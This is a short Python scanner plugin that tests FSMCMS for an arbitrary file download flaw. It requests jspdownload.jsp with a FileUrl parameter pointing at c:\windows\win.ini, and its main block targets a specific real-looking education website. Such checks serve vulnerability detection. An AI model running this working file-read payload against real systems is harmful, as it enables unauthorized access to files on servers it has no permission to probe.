#!/usr/bin/python
#-*- encoding:utf-8 -*-
# title:fsmcms任意文件下载
#http://www.wooyun.org/bugs/wooyun-2010-0116270

def assign(service, arg):
    if service == "fsmcms":
        return True, arg


def audit(arg):
    payload = 'fsmcms/cms/web/jspdownload.jsp?FileUrl=c:%5Cwindows%5Cwin.ini'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 200 and '[fonts]' in res and '[extensions]' in res and '[files]' in res:
        security_warning(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('fsmcms', 'http://www.gxhzedu.net/')[1])